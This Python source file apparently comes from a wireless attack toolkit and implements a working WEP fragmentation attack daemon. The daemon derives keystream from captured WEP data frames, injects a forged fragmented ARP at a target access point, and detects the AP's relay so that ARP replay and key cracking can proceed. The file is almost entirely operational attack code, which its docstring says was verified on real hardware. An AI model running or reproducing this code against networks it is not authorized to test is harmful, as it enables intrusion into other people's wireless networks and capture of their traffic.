"""WEP fragmentation attack (`aireplay-ng -5`) — M5.

Manufactures a replayable ARP when there's none to capture — the whole reason
`-5` exists. Seed 8 bytes of keystream from ANY captured WEP *data* frame via
its fixed LLC/SNAP prefix (NOT a broadcast ARP — depending on one would be
circular: ARP replay would already have that seed), then fragment a
known-plaintext broadcast ARP into ≤16 tiny frames encrypted under that seed.
The AP reassembles them, re-encrypts under a fresh IV, and rebroadcasts the
result — which is itself a replayable ARP seed. So one ordinary client data
packet (a TCP segment you can't replay) becomes a forged ARP you can.

HARDWARE-VERIFIED end-to-end (2026-05-24, dd-wrt, rtl8821au): a decrypted relay
matched our forged ARP byte-for-byte. The crypto is in wep_crypto.py
(`seed_keystream_from_arp`, `build_fragments`); this daemon wires the send loop
+ the live-AP ORACLE around it.

ORACLE (pinned from the probe pcap): the AP's relay of our reassembled ARP is a
Data frame, FromDS + Protected, Addr1(DA)=broadcast, **Addr3(SA)=our forged STA
MAC**, with a FRESH IV (≠ our seed's), ~68 B. The box rebroadcasts onto every
BSS it runs, so we match on SA==our_mac, NOT on a specific BSSID.

State machine (locked design, README "M5/M6 — refined"): user-driven, NOT
auto-escalating. The ONE auto-transition is on SUCCESS (unambiguous): the moment
a relay with our SA appears, we hand it to the campaign (`on_forged_arp`) and
stop — immediate handoff, because ARP replay mints IVs far faster than
fragmentation does, and that relay is already a store-logged seed. A round that
elicits no relay is NOT failure (could be range / TX glitch / a momentarily busy
AP) — we KEEP RETRYING and log a running tally so the *user* decides when to
switch; we never auto-stop. The campaign pauses ARP replay before starting us
(one TX activity on the half-duplex radio) and resumes it on our success.
"""

from __future__ import annotations

import asyncio
import logging
import time
from typing import Awaitable, Callable, List, Optional

from wifit3.engine.models import AccessPoint
from wifit3.engine.attacks.wep.wep_crypto import (
    arp_request_plaintext,
    build_fragments,
    seed_keystream_from_data,
)

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff" * 6
# Ethertypes to assume for the seed's 7th-8th keystream bytes (the SNAP header's
# first 6 are certain). IP dominates real traffic; ARP is the other common case.
# A wrong guess just yields no relay → the seed rotates.
_SEED_ETHERTYPES = (0x0800, 0x0806)


async def _always_associated() -> bool:
    return True


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _hdr_len(fc0: int, fc1: int) -> int:
    """MAC-header length before the WEP body (mirrors arp_replay's logic)."""
    n = 24
    if (fc1 & 0x01) and (fc1 & 0x02):   # ToDS+FromDS → 4-address (WDS)
        n += 6
    if ((fc0 & 0xF0) >> 4) & 0x08:      # QoS data subtype
        n += 2
    if fc1 & 0x80:                      # HT Control (Order bit)
        n += 4
    return n


class WepFragmentation:
    """Fragmentation daemon: seed → fragmented broadcast ARP → AP relay → hand
    the relay to ARP replay. Lifecycle mirrors WepArpReplay."""

    # Pause between fragment rounds — the RX window for the AP's relay to land.
    _ROUND_GAP = 0.2
    # If a seed yields no relay after this many rounds, it may be a bad pick
    # (non-ARP frame of ARP size, stale IV) — blacklist it and try another.
    _RESEED_AFTER = 25
    # Heartbeat tally cadence (seconds) so the user can judge when to switch.
    _HEARTBEAT_S = 5.0

    def __init__(
        self,
        iface,
        target: AccessPoint,
        store,
        source_mac: bytes,
        on_forged_arp: Callable[[bytes], None],
        ensure_associated: Optional[Callable[[], Awaitable[bool]]] = None,
        notify_activity: Optional[Callable[[], None]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
        sender_ip: bytes = bytes([192, 168, 1, 123]),
        target_ip: bytes = bytes([192, 168, 1, 1]),
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.store = store
        self.source_mac = source_mac
        # Called with the AP's relayed frame on success → campaign resumes
        # replay (the relay is already an ARP-sized broadcast seed in the store).
        self._on_forged_arp = on_forged_arp
        # Awaited before injecting — authenticates lazily (True iff associated).
        self._ensure_associated = ensure_associated or _always_associated
        # Our fragments keep the assoc alive while we're injecting.
        self._notify_activity = notify_activity or (lambda: None)
        self._log = log_callback or (lambda _m: None)
        self._sender_ip = sender_ip
        self._target_ip = target_ip

        self.state = "idle"        # idle|waiting-auth|seeding|injecting|success
        self._active = False
        self._task: Optional[asyncio.Task] = None

        # Current seed (IV + 8-byte keystream) and the fragments built from it.
        self._seed_iv: Optional[bytes] = None
        self._seed_key: Optional[tuple] = None   # (iv, ethertype) under test
        self._frags: List[bytes] = []
        self._tried: set = set()                 # (iv, ethertype) keys gone dry
        self._round = 0
        self._rounds_on_seed = 0

        # Oracle: set by the RX callback when a relay with our SA appears.
        self._relay_seen = False
        self._relay_frame: Optional[bytes] = None

        self._last_state = ""
        self._last_heartbeat = 0.0

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self._relay_seen = False
        self._round = 0
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._loop())
        logger.info("[WEP-Frag] Started on %s as %s",
                    self.bssid, self.source_mac.hex())
        if not getattr(self.iface, "supports_sw_seq", False):
            # Without software seq the chip stamps each fragment with its own
            # sequence number and the AP can't reassemble — say so plainly
            # rather than spinning uselessly.
            self._log(
                "[yellow]Fragmentation: this card can't set a software sequence "
                "number — fragments won't reassemble. (rtl8821au can.)[/yellow]"
            )

    def stop(self):
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info("[WEP-Frag] Stopped after %d rounds.", self._round)

    @property
    def is_active(self) -> bool:
        return self._active

    # ---- Seed + fragment building -------------------------------------------

    def _pick_seed(self) -> bool:
        """Choose a not-yet-exhausted (data-frame, ethertype-guess) seed and
        build the fragment train from it. Seeds come from ANY captured WEP data
        frame (store.seed_samples) — never a replayable ARP. Returns True if a
        usable seed was found + fragments built."""
        payload = arp_request_plaintext(
            sender_mac=self.source_mac,
            sender_ip=self._sender_ip,
            target_ip=self._target_ip,
        )
        for iv, cipher in reversed(self.store.seed_samples(self.bssid)):  # new 1st
            for etype in _SEED_ETHERTYPES:
                key = (iv, etype)
                if key in self._tried:
                    continue
                try:
                    seed_ks = seed_keystream_from_data(
                        cipher, want=8, ethertype=etype
                    )
                    self._frags = build_fragments(
                        seed_ks, iv, payload,
                        bssid=_str_to_mac(self.bssid),
                        source_mac=self.source_mac,
                        dest_mac=_BROADCAST,
                    )
                except ValueError:
                    continue
                self._seed_iv = iv
                self._seed_key = key
                self._rounds_on_seed = 0
                self._log(
                    "[cyan]→ Fragmentation:[/cyan] Data seeded, "
                    "[green]forging packet…[/green]"
                )
                return True
        return False

    # ---- Send loop ----------------------------------------------------------

    async def _loop(self) -> None:
        try:
            while self._active:
                # Need a (fresh) seed?
                if self._seed_iv is None:
                    if not self._pick_seed():
                        self._set_state("seeding")
                        await asyncio.sleep(0.3)
                        self._maybe_heartbeat()
                        continue

                # We have a seed to fragment — now (lazily) associate.
                if not await self._ensure_associated():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.3)
                    continue

                self._set_state("injecting")
                await self._inject_round()
                if self._relay_seen:
                    self._succeed()
                    return

                # No relay this round — keep retrying (NOT a failure), and if a
                # seed is persistently barren, rotate to a different one.
                self._rounds_on_seed += 1
                if self._rounds_on_seed >= self._RESEED_AFTER:
                    if self._seed_key is not None:
                        self._tried.add(self._seed_key)
                    self._seed_iv = None      # force a re-pick next iteration
                    self._seed_key = None
                self._maybe_heartbeat()
        except asyncio.CancelledError:
            pass

    async def _inject_round(self) -> None:
        """Send the fragment train once under a rolling shared sequence number,
        then give the AP a window to relay before we judge."""
        sw_seq = self._round & 0xFFF          # shared across this round's frags
        for fr in self._frags:
            if not self._active:
                return
            try:
                await self.iface.send_raw(fr, use_no_ack=True, sw_seq=sw_seq)
            except Exception:
                logger.exception("[WEP-Frag] send_raw failed")
                return
        self._notify_activity()   # keep the assoc alive while injecting
        self._round += 1
        # RX window — the oracle (RX callback) sets _relay_seen if it lands.
        await asyncio.sleep(self._ROUND_GAP)

    def _succeed(self) -> None:
        self._set_state("success")
        self._log(
            "[green]✓ Fragmentation worked![/green] "
            "[dim](AP replayed forged ARP)[/dim]"
        )
        frame = self._relay_frame
        # Immediate handoff: stop injecting, hand the relay to the campaign.
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if frame is not None:
            try:
                self._on_forged_arp(frame)
            except Exception:
                logger.exception("[WEP-Frag] on_forged_arp callback failed")

    # ---- Oracle (RX callback) -----------------------------------------------

    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        """Watch for the AP relaying our reassembled ARP. Pinned signature:
        Data + FromDS + Protected + DA=broadcast + SA(Addr3)==our MAC + fresh
        IV. Match on SA, not BSSID (the box relays onto sibling BSSes). Keep it
        fast — runs on every received frame."""
        if not self._active or self._relay_seen or len(frame) < 28:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2:                # not data
            return
        if not (fc1 & 0x40):                        # not Protected (WEP)
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):        # need FromDS, not ToDS
            return
        if frame[4:10] != _BROADCAST:               # Addr1 (DA) not broadcast
            return
        if frame[16:22] != self.source_mac:         # Addr3 (SA) not us
            return
        body = frame[_hdr_len(fc0, fc1):]
        if len(body) < 4 or body[:3] == self._seed_iv:   # need a FRESH IV
            return
        self._relay_frame = bytes(frame)
        self._relay_seen = True

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        self.state = state
        if state == self._last_state:
            return
        self._last_state = state
        if state == "seeding":
            self._log(
                "[cyan]→ Fragmentation:[/cyan] waiting for Data packet… "
                "[dim](ETA: unknown)[/dim]"
            )
        # waiting-auth is silent — the SECURITY panel shows fake-auth status,
        # and a separate "waiting for association" line is just noise.

    def _maybe_heartbeat(self) -> None:
        now = time.time()
        if now - self._last_heartbeat < self._HEARTBEAT_S:
            return
        self._last_heartbeat = now
        if self.state == "injecting":
            self._log(
                f"[green]Fragmentation:[/green] [dim]{self._round} rounds, no "
                f"relay yet — still trying (switch attacks if it stays "
                f"flat)[/dim]"
            )
